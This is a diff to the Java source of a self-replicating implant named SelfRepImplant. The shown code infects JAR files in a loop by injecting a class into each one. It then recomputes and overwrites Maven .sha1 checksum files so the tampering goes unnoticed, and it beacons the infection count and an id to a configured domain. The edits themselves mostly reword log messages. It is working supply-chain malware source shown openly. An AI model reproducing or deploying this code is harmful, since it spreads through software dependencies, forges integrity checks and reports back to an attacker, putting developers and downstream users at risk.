@@ -15,6 +15,8 @@ import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.util.*;
 import java.util.jar.JarFile;
+import java.util.logging.Handler;
+import java.util.logging.Logger;
 
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
@@ -96,22 +98,20 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             throw new RuntimeException("Unreachable");
         }
 
-        System.out.println("[i] Implant: " + implantHandler.getImplantClassName());
-        System.out.println();
+        System.out.println("[*] Implant: " + implantHandler.getImplantClassName());
 
         int numInfected = 0;
         for (Path jarToImplant : jarsToImplant) {
             // Potential optimization: Multi-thread this.
-            System.out.println("[+] Infecting " + jarToImplant + "...");
             ClassInjector injector = new ClassInjector(implantHandler);
 
             try {
                 injector.infect(jarToImplant, jarToImplant);
                 numInfected++;
-                System.out.println("[+] Spiked " + jarToImplant);
+                System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
             } catch (IOException e) {
-                System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
-                e.printStackTrace();
+                System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
+                //e.printStackTrace();
             }
 
             // Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
@@ -121,13 +121,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                     // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
                     String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
                     Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
-                    System.out.println("[+] Overwrote '" + sha1File + "'.");
+                    System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
                 } catch (IOException e) {
-                    System.out.println("[-] Failed to overwrite SHA1 has file '" + sha1File + "'.");
+                    System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
                 }
             }
-
-            System.out.println();
         }
 
         callHpme(CONF_DOMAIN, "did-" + numInfected, id);
